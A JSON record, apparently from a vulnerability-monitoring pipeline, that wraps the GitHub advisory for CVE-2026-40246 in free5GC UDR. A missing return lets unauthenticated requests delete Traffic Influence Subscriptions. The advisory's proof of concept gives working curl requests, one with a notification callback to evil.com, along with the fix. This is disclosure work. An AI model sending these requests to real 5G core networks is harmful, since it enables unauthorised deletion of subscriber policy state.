@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/56028149?v=4\", \"events_url\": \"https://api.github.com/users/Giancannella/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Giancannella/followers\", \"following_url\": \"https://api.github.com/users/Giancannella/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Giancannella/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Giancannella\", \"id\": 56028149, \"login\": \"Giancannella\", \"node_id\": \"MDQ6VXNlcjU2MDI4MTQ5\", \"organizations_url\": \"https://api.github.com/users/Giancannella/orgs\", \"received_events_url\": \"https://api.github.com/users/Giancannella/received_events\", \"repos_url\": \"https://api.github.com/users/Giancannella/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Giancannella/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Giancannella/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Giancannella\", \"user_view_type\": \"public\"}}, {\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/26974049?v=4\", \"events_url\": \"https://api.github.com/users/FrancescoDAlterio/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/FrancescoDAlterio/followers\", \"following_url\": \"https://api.github.com/users/FrancescoDAlterio/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/FrancescoDAlterio/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/FrancescoDAlterio\", \"id\": 26974049, \"login\": \"FrancescoDAlterio\", \"node_id\": \"MDQ6VXNlcjI2OTc0MDQ5\", \"organizations_url\": \"https://api.github.com/users/FrancescoDAlterio/orgs\", \"received_events_url\": \"https://api.github.com/users/FrancescoDAlterio/received_events\", \"repos_url\": \"https://api.github.com/users/FrancescoDAlterio/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/FrancescoDAlterio/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/FrancescoDAlterio/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/FrancescoDAlterio\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-40246\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N\"}, \"cvss_v4\": {\"score\": 8.7, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-285\", \"name\": \"Improper Authorization\"}], \"description\": \"### Summary\\nAn improper path validation vulnerability in the UDR service allows any unauthenticated attacker with access to the 5G Service Based Interface (SBI) to delete Traffic Influence Subscriptions by supplying an arbitrary value in place of the expected `subs-to-notify` path segment.\\n\\n### Details\\nThe endpoint `DELETE /nudr-dr/v2/application-data/influenceData/{influenceId}/{subscriptionId}` is intended to only operate on Traffic Influence Subscription resources when `influenceId` is exactly `subs-to-notify`.\\n\\nIn the free5GC UDR implementation, the path validation is present but ineffective because the handler does not return after sending the HTTP 404 response. The request handling flow is:\\n\\n1. The function `HandleApplicationDataInfluenceDataSubsToNotifySubscriptionIdDelete` in `./free5gc_4-2-1/free5gc/NFs/udr/internal/sbi/api_datarepository.go` checks whether `influenceId != \\\"subs-to-notify\\\"`.\\n2. If the value is different, it calls `c.String(http.StatusNotFound, \\\"404 page not found\\\")`, **but it does not return afterwards**.\\n3. Execution continues and the handler still calls `s.Processor().ApplicationDataInfluenceDataSubsToNotifySubscriptionIdDeleteProcedure(c, subscriptionId)`.\\n4. The processor deletes the subscription identified by `subscriptionId` even though the path is invalid and the request should have been rejected.\\n\\nAs a result, an attacker can send a request to an invalid path, receive an apparent `404 page not found` response, and still successfully delete the target subscription.\\n\\nThe missing `return` after sending the 404 response in `api_datarepository.go` is the root cause of this vulnerability.\\n\\n### PoC\\nNo authentication is required. Only a valid `subscriptionId` is needed.\\n\\n```bash\\n# Create a subscription to obtain a valid subscriptionId\\ncurl -v -X POST \\\"http://<udr-host>/nudr-dr/v2/application-data/influenceData/subs-to-notify\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\n    \\\"notificationUri\\\":\\\"http://evil.com/notify\\\",\\n    \\\"dnns\\\":[\\\"internet\\\"],\\n    \\\"supis\\\":[\\\"imsi-222777483957498\\\"]\\n  }'\\n```\\nExample response:\\n```\\nHTTP/1.1 201 Created\\n```\\n\\nThen delete it through an invalid path:\\n```bash\\ncurl -v -X DELETE \\\"http://<udr-host>/nudr-dr/v2/application-data/influenceData/WRONGID/87615e16\\\"\\n```\\nResponse:\\n```\\nHTTP/1.1 404 Not Found\\n404 page not found\\n```\\nNow verify that the subscription was actually deleted:\\n```bash\\ncurl -v \\\"http://<udr-host>/nudr-dr/v2/application-data/influenceData/subs-to-notify/87615e16\\\"\\n```\\nResponse:\\n```json\\n{\\\"title\\\":\\\"User not found\\\",\\\"status\\\":404,\\\"cause\\\":\\\"USER_NOT_FOUND\\\"}\\n```\\n### Impact\\nThis is an unauthenticated unauthorized delete vulnerability. Any attacker with network access to the SBI can delete Traffic Influence Subscriptions by knowing or guessing a valid subscriptionId.\\n\\nThis can disrupt policy-related notification workflows and remove active subscription state from the UDR. In addition, the attack is harder to detect because the API returns a misleading 404 Not Found response even when the deletion is actually performed.\\n\\nImpacted deployments: any free5GC instance where the SBI is reachable by untrusted parties (e.g., misconfigured network segmentation, rogue NF, or compromised internal host).\\n\\n### Patch\\nThe vulnerability has been confirmed patched by adding the missing return\\nstatement in NFs/udr/internal/sbi/api_datarepository.go,\\nfunction HandleApplicationDataInfluenceDataSubsToNotifySubscriptionIdDelete:\\n```go\\nif influenceId != \\\"subs-to-notify\\\" {\\n    c.String(http.StatusNotFound, \\\"404 page not found\\\")\\n    return\\n}\\n```\\nWith the patch applied, requests using an invalid influenceId now correctly\\nreturn HTTP 404 and do not delete the targeted subscription.\", \"epss\": {\"percentage\": 0.0038, \"percentile\": 0.29675}, \"ghsa_id\": \"GHSA-g9cw-qwhf-24jp\", \"github_reviewed_at\": \"2026-04-14T20:00:24Z\", \"html_url\": \"https://github.com/advisories/GHSA-g9cw-qwhf-24jp\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-g9cw-qwhf-24jp\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-40246\"}], \"nvd_published_at\": \"2026-04-16T22:16:38Z\", \"published_at\": \"2026-04-14T20:00:24Z\", \"references\": [\"https://github.com/free5gc/free5gc/security/advisories/GHSA-g9cw-qwhf-24jp\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-40246\", \"https://github.com/advisories/GHSA-g9cw-qwhf-24jp\"], \"repository_advisory_url\": \"https://api.github.com/repos/free5gc/free5gc/security-advisories/GHSA-g9cw-qwhf-24jp\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/free5gc/udr\", \"summary\": \"free5gc UDR improper path validation allows unauthenticated deletion of Traffic Influence Subscriptions\", \"type\": \"reviewed\", \"updated_at\": \"2026-04-24T20:36:33Z\", \"url\": \"https://api.github.com/advisories/GHSA-g9cw-qwhf-24jp\", \"vulnerabilities\": [{\"first_patched_version\": null, \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/free5gc/udr\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.4.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-g9cw-qwhf-24jp",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/free5gc/udr: <= 1.4.2"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-40246"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/free5gc/udr"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:04.851066Z",
+  "provenance": {
+    "content_sha256": "0a7cf02dfa5dea96347f1ee4d80e96783da3a72c29ded726f069d61548ba1347",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-04-14T20:00:24Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-g9cw-qwhf-24jp",
+  "status": "active",
+  "title": "free5gc UDR improper path validation allows unauthenticated deletion of Traffic Influence Subscriptions",
+  "updated_at": "2026-04-24T20:36:33Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-g9cw-qwhf-24jp"
+}
